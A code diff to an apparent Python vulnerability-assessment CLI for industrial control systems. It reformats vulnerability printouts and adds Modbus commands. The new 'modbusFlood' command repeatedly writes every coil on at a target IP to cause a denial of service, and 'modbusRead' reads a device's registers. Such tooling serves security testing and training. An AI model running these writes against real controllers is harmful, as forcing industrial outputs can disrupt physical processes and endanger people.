@@ -6,6 +6,7 @@ import subprocess
 import json
 import re
 import time
+import modbusExploit
 
 
 class Parser():
@@ -32,13 +33,13 @@ class CLI(cmd.Cmd):
     def printVul(self, doc, name):
         print(name)
         print("")
-        print(doc["VulnerablePort"])
+        print("Ports Vulnerable"+doc["VulnerablePort"])
         print("")
-        print(doc["STRIDE"])
+        print("Vulnerable to"+doc["STRIDE"])
         print("")
         print("CVSS: "+str(doc["CVSS"]))
         print("")
-        print(doc["Recommendation"])
+        print("Recommendation"+doc["Recommendation"])
 
     def update_score(self, delta):
         self.score = self.score + delta
@@ -60,6 +61,25 @@ class CLI(cmd.Cmd):
         if len(result.group()) > 1:
             return True
         return False
+
+    def do_modbusRead(self, line):
+        """Reads both the coil and register value on a given address (int)"""
+        exploit = modbusExploit.ModBusExploit(self.target_ip)
+        exploit.read_registers_and_coils(int(line))
+
+    def do_modbusFlood(self, line):
+        """Continuos writes to the modbus coils to simulate a DoS attack"""
+        exploit = None
+        try:
+            exploit = modbusExploit.ModBusExploit(self.target_ip)
+        except Exception:
+            print("could not connect on "+self.target_ip)
+            return
+        print("Begin Attack")
+        for i in range(1000):
+            print(str(i % 100)+"%")
+            for j in range(0, 150):
+                exploit.write_all_coils_on(j)
 
     def do_version(self, line):
         """version checker"""
